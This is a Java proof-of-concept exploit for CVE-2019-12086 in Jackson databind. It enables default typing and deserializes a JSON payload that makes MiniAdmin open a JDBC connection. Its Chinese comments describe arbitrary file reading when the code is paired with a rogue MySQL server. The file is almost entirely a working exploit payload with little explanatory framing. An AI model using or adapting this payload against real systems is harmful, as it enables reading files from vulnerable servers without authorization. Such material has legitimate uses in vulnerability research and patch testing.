package com.dem0.cve;

import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.sql.SQLException;
import com.mysql.cj.jdbc.admin.MiniAdmin;

public class CVE_2019_12086 {
    ////任意文件读取com.fasterxml.jackson.core <2.9.9
    public static void main(String[] args) throws SQLException, IOException, IOException {
        ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        //开启 enableDefaultTyping ，使用构造方法反序列化的方式反序列化 MiniAdmin 类
        //配合roguemysql使用
        String json = "[\"com.mysql.cj.jdbc.admin.MiniAdmin\", \"jdbc:mysql://127.0.0.1:3306/?user=root\"]";
        mapper.readValue(json, Object.class);

        //问题在于
        /*
         public MiniAdmin(String jdbcUrl, Properties props) throws SQLException {
        this.conn = (JdbcConnection)((JdbcConnection)(new Driver()).connect(jdbcUrl, props));}
         */
    }
}
